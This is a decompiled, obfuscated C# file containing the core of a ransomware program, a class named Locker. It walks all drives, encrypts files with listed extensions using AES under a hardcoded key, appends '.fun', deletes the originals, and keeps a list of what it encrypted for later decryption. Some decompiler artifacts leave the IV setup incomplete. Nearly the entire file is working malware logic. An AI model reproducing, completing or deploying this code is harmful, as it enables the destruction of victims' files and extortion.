using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using Main.Properties;

namespace Main.Tools;

internal static class Locker
{
	private static readonly string EncryptedFileListPath = Locker.smethod_6(Config.WorkFolderPath, "EncryptedFileList.txt");

	private static readonly HashSet<string> EncryptedFiles = new HashSet<string>();

	private const string EncryptionFileExtension = ".fun";

	private const string EncryptionPassword = "OoIsAwwF23cICQoLDA0ODe==";

	internal static void EncryptFileSystem()
	{
		HashSet<string> extensionsToEncrypt = new HashSet<string>(GetExtensionsToEncrypt());
		IEnumerator<string> enumerator = (from drive in Locker.smethod_0()
			select _003C_003Ec.smethod_1((FileSystemInfo)_003C_003Ec.smethod_0(drive))).GetEnumerator();
		try
		{
			while (Locker.smethod_1((IEnumerator)enumerator))
			{
				EncryptFiles(enumerator.Current, ".fun", extensionsToEncrypt);
			}
		}
		finally
		{
			if (enumerator != null)
			{
				Locker.smethod_2((IDisposable)enumerator);
			}
		}
		if (!Locker.smethod_3(EncryptedFileListPath))
		{
			string[] string_ = EncryptedFiles.ToArray();
			Locker.smethod_4(EncryptedFileListPath, string_);
		}
	}

	internal static HashSet<string> GetEncryptedFiles()
	{
		HashSet<string> hashSet = new HashSet<string>();
		if (Locker.smethod_3(EncryptedFileListPath))
		{
			string[] array = Locker.smethod_5(EncryptedFileListPath);
			foreach (string item in array)
			{
				hashSet.Add(item);
			}
		}
		return hashSet;
	}

	private static string CreateFileSystemSimulation()
	{
		string text = Locker.smethod_6(Config.WorkFolderPath, "FileSystemSimulation");
		if (!Locker.smethod_7(text))
		{
			Locker.smethod_8(text);
		}
		TextWriter textWriter = Locker.smethod_9(Locker.smethod_6(text, "TxtTest.txt"), bool_0: true);
		try
		{
			Locker.smethod_10(textWriter, "I am a txt test.");
		}
		finally
		{
			if (textWriter != null)
			{
				Locker.smethod_2((IDisposable)textWriter);
			}
		}
		TextWriter textWriter2 = Locker.smethod_9(Locker.smethod_6(text, "NotTxtTest.nottxt"), bool_0: true);
		try
		{
			Locker.smethod_10(textWriter2, "I am NOT a txt test.");
			return text;
		}
		finally
		{
			if (textWriter2 != null)
			{
				Locker.smethod_2((IDisposable)textWriter2);
			}
		}
	}

	private static IEnumerable<string> GetExtensionsToEncrypt()
	{
		HashSet<string> hashSet = new HashSet<string>();
		foreach (string item in Locker.smethod_12(Resources.ExtensionsToEncrypt, new string[2]
		{
			Locker.smethod_11(),
			" "
		}, StringSplitOptions.RemoveEmptyEntries).ToList())
		{
			hashSet.Add(Locker.smethod_13(item));
		}
		hashSet.Remove(".fun");
		return hashSet;
	}

	private static IEnumerable<string> GetFiles(string path)
	{
		Queue<string> queue = new Queue<string>();
		queue.Enqueue(path);
		while (queue.Count > 0)
		{
			path = queue.Dequeue();
			try
			{
				string[] array = _003CGetFiles_003Ed__8.smethod_2(path);
				foreach (string item in array)
				{
					queue.Enqueue(item);
				}
			}
			catch (Exception object_)
			{
				_003CGetFiles_003Ed__8.smethod_4(_003CGetFiles_003Ed__8.smethod_3(), (object)object_);
			}
			string[] array2 = null;
			try
			{
				array2 = _003CGetFiles_003Ed__8.smethod_5(path);
			}
			catch (Exception object_2)
			{
				_003CGetFiles_003Ed__8.smethod_4(_003CGetFiles_003Ed__8.smethod_3(), (object)object_2);
			}
			if (array2 != null)
			{
				string[] array3 = array2;
				for (int j = 0; j < array3.Length; j++)
				{
					yield return array3[j];
				}
			}
		}
	}

	private static void EncryptFiles(string dirPath, string encryptionExtension, HashSet<string> extensionsToEncrypt)
	{
		IEnumerator<string> enumerator = (from file in GetFiles(dirPath)
			from ext in extensionsToEncrypt
			where _003C_003Ec.smethod_2(file, ext)
			select file into file
			select new
			{
				file = file,
				fi = _003C_003Ec.smethod_3(file)
			} into t
			where _003C_003Ec.smethod_4(t.fi) < 10000000L
			select t.file).GetEnumerator();
		try
		{
			while (Locker.smethod_1((IEnumerator)enumerator))
			{
				string current = enumerator.Current;
				try
				{
					if (EncryptFile(current, encryptionExtension))
					{
						EncryptedFiles.Add(current);
					}
				}
				catch
				{
				}
			}
		}
		finally
		{
			if (enumerator != null)
			{
				Locker.smethod_2((IDisposable)enumerator);
			}
		}
	}

	internal static void DecryptFiles(string encryptionExtension)
	{
		foreach (string encryptedFile in GetEncryptedFiles())
		{
			try
			{
				string text = Locker.smethod_14(encryptedFile, encryptionExtension);
				DecryptFile(text, encryptionExtension);
				Locker.smethod_15(text);
			}
			catch
			{
			}
		}
		Locker.smethod_15(EncryptedFileListPath);
	}

	private static bool EncryptFile(string path, string encryptionExtension)
	{
		try
		{
			if (Config.StartMode != 0 && (Locker.smethod_16(path, Config.WorkFolderPath, StringComparison.InvariantCulture) || Locker.smethod_16(path, "C:\\Windows", StringComparison.InvariantCultureIgnoreCase)))
			{
				return false;
			}
			AesCryptoServiceProvider aesCryptoServiceProvider = Locker.smethod_17();
			try
			{
				Locker.smethod_19((SymmetricAlgorithm)aesCryptoServiceProvider, Locker.smethod_18("OoIsAwwF23cICQoLDA0ODe=="));
				byte[] array = new byte[16];
				Locker.smethod_20((Array)array, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
				Locker.smethod_21((SymmetricAlgorithm)aesCryptoServiceProvider, array);
				EncryptFile(aesCryptoServiceProvider, path, Locker.smethod_14(path, encryptionExtension));
			}
			finally
			{
				if (aesCryptoServiceProvider != null)
				{
					Locker.smethod_2((IDisposable)aesCryptoServiceProvider);
				}
			}
		}
		catch
		{
			return false;
		}
		try
		{
			Locker.smethod_15(path);
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}

	private static void DecryptFile(string path, string encryptionExtension)
	{
		try
		{
			if (!Locker.smethod_22(path, encryptionExtension))
			{
				return;
			}
			string outputFile = Locker.smethod_24(path, Locker.smethod_23(path) - 4);
			AesCryptoServiceProvider aesCryptoServiceProvider = Locker.smethod_17();
			try
			{
				Locker.smethod_19((SymmetricAlgorithm)aesCryptoServiceProvider, Locker.smethod_18("OoIsAwwF23cICQoLDA0ODe=="));
				byte[] array = new byte[16];
				Locker.smethod_20((Array)array, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
				Locker.smethod_21((SymmetricAlgorithm)aesCryptoServiceProvider, array);
				DecryptFile(aesCryptoServiceProvider, path, outputFile);
			}
			finally
			{
				if (aesCryptoServiceProvider != null)
				{
					Locker.smethod_2((IDisposable)aesCryptoServiceProvider);
				}
			}
		}
		catch
		{
			return;
		}
		try
		{
			Locker.smethod_15(path);
		}
		catch (Exception)
		{
		}
	}

	private static void EncryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
	{
		byte[] array = new byte[65536];
		FileStream fileStream = Locker.smethod_25(inputFile, FileMode.Open);
		try
		{
			FileStream fileStream2 = Locker.smethod_25(outputFile, FileMode.Create);
			try
			{
				CryptoStream cryptoStream = Locker.smethod_27((Stream)fileStream2, Locker.smethod_26(alg), CryptoStreamMode.Write);
				try
				{
					int num;
					do
					{
						num = Locker.smethod_28((Stream)fileStream, array, 0, array.Length);
						if (num != 0)
						{
							Locker.smethod_29((Stream)cryptoStream, array, 0, num);
						}
					}
					while (num != 0);
				}
				finally
				{
					if (cryptoStream != null)
					{
						Locker.smethod_2((IDisposable)cryptoStream);
					}
				}
			}
			finally
			{
				if (fileStream2 != null)
				{
					Locker.smethod_2((IDisposable)fileStream2);
				}
			}
		}
		finally
		{
			if (fileStream != null)
			{
				Locker.smethod_2((IDisposable)fileStream);
			}
		}
	}

	private static void DecryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
	{
		byte[] array = new byte[65536];
		FileStream fileStream = Locker.smethod_25(inputFile, FileMode.Open);
		try
		{
			FileStream fileStream2 = Locker.smethod_25(outputFile, FileMode.Create);
			try
			{
				CryptoStream cryptoStream = Locker.smethod_27((Stream)fileStream2, Locker.smethod_30(alg), CryptoStreamMode.Write);
				try
				{
					int num;
					do
					{
						num = Locker.smethod_28((Stream)fileStream, array, 0, array.Length);
						if (num != 0)
						{
							Locker.smethod_29((Stream)cryptoStream, array, 0, num);
						}
					}
					while (num != 0);
				}
				finally
				{
					if (cryptoStream != null)
					{
						Locker.smethod_2((IDisposable)cryptoStream);
					}
				}
			}
			finally
			{
				if (fileStream2 != null)
				{
					Locker.smethod_2((IDisposable)fileStream2);
				}
			}
		}
		finally
		{
			if (fileStream != null)
			{
				Locker.smethod_2((IDisposable)fileStream);
			}
		}
	}

	static DriveInfo[] smethod_0()
	{
		return DriveInfo.GetDrives();
	}

	static bool smethod_1(IEnumerator ienumerator_0)
	{
		return ienumerator_0.MoveNext();
	}

	static void smethod_2(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static bool smethod_3(string string_0)
	{
		return File.Exists(string_0);
	}

	static void smethod_4(string string_0, string[] string_1)
	{
		File.WriteAllLines(string_0, string_1);
	}

	static string[] smethod_5(string string_0)
	{
		return File.ReadAllLines(string_0);
	}

	static string smethod_6(string string_0, string string_1)
	{
		return Path.Combine(string_0, string_1);
	}

	static bool smethod_7(string string_0)
	{
		return Directory.Exists(string_0);
	}

	static DirectoryInfo smethod_8(string string_0)
	{
		return Directory.CreateDirectory(string_0);
	}

	static StreamWriter smethod_9(string string_0, bool bool_0)
	{
		return new StreamWriter(string_0, bool_0);
	}

	static void smethod_10(TextWriter textWriter_0, string string_0)
	{
		textWriter_0.WriteLine(string_0);
	}

	static string smethod_11()
	{
		return Environment.NewLine;
	}

	static string[] smethod_12(string string_0, string[] string_1, StringSplitOptions stringSplitOptions_0)
	{
		return string_0.Split(string_1, stringSplitOptions_0);
	}

	static string smethod_13(string string_0)
	{
		return string_0.Trim();
	}

	static string smethod_14(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_15(string string_0)
	{
		File.Delete(string_0);
	}

	static bool smethod_16(string string_0, string string_1, StringComparison stringComparison_0)
	{
		return string_0.StartsWith(string_1, stringComparison_0);
	}

	static AesCryptoServiceProvider smethod_17()
	{
		return new AesCryptoServiceProvider();
	}

	static byte[] smethod_18(string string_0)
	{
		return Convert.FromBase64String(string_0);
	}

	static void smethod_19(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0)
	{
		symmetricAlgorithm_0.Key = byte_0;
	}

	static void smethod_20(Array array_0, RuntimeFieldHandle runtimeFieldHandle_0)
	{
		RuntimeHelpers.InitializeArray(array_0, runtimeFieldHandle_0);
	}

	static void smethod_21(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0)
	{
		symmetricAlgorithm_0.IV = byte_0;
	}

	static bool smethod_22(string string_0, string string_1)
	{
		return string_0.EndsWith(string_1);
	}

	static int smethod_23(string string_0)
	{
		return string_0.Length;
	}

	static string smethod_24(string string_0, int int_0)
	{
		return string_0.Remove(int_0);
	}

	static FileStream smethod_25(string string_0, FileMode fileMode_0)
	{
		return new FileStream(string_0, fileMode_0);
	}

	static ICryptoTransform smethod_26(SymmetricAlgorithm symmetricAlgorithm_0)
	{
		return symmetricAlgorithm_0.CreateEncryptor();
	}

	static CryptoStream smethod_27(Stream stream_0, ICryptoTransform icryptoTransform_0, CryptoStreamMode cryptoStreamMode_0)
	{
		return new CryptoStream(stream_0, icryptoTransform_0, cryptoStreamMode_0);
	}

	static int smethod_28(Stream stream_0, byte[] byte_0, int int_0, int int_1)
	{
		return stream_0.Read(byte_0, int_0, int_1);
	}

	static void smethod_29(Stream stream_0, byte[] byte_0, int int_0, int int_1)
	{
		stream_0.Write(byte_0, int_0, int_1);
	}

	static ICryptoTransform smethod_30(SymmetricAlgorithm symmetricAlgorithm_0)
	{
		return symmetricAlgorithm_0.CreateDecryptor();
	}
}
